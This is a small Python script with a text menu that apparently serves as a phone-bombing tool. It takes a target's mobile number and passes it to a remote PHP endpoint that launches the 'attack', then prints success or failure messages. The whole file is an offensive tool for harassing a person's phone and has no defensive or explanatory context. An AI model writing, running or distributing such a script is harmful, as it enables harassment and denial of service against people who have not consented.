import requests

HEADER = '\033[92m'  
OKBLUE = '\033[94m'  
ENDCOLOR = '\033[0m'

def start_attack():
    mobile_number = input("Enter the mobile number to attack: ")
    url = f"https://hadivai-mahirvai.my.id/kupasamsu.php?phone={mobile_number}"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(f"{HEADER}Attack started successfully!{ENDCOLOR}")
        else:
            print(f"{HEADER}Failed to start the attack.{ENDCOLOR}")
    except Exception as e:
        print(f"{HEADER}An error occurred while starting the attack: {str(e)}{ENDCOLOR}")

def main():
    while True:
        print("\t\t\t┌───────────────────┐")
        print("\t\t\t│   MENU  │")
        print("\t\t\t└───────────────────┘")
        print("\t\t\t┌───────────────────┐")
        print("\t\t\t│ [1] Start Attack │")
        print("\t\t\t│ [0] Exit          │")
        print("\t\t\t└───────────────────┘")
        choice = input(f"{HEADER}Enter your choice: {ENDCOLOR}").strip()
        if choice == "1":
            print(f"{OKBLUE}Starting attack...{ENDCOLOR}")
            start_attack()
            print(f"{HEADER}Attack complete!{ENDCOLOR}")
        elif choice == "0":
            print(f"{OKBLUE}Exiting...{ENDCOLOR}")
            break
        else:
            print(f"{HEADER}Invalid choice! Please try again.{ENDCOLOR}")

if __name__ == "__main__":
    main()
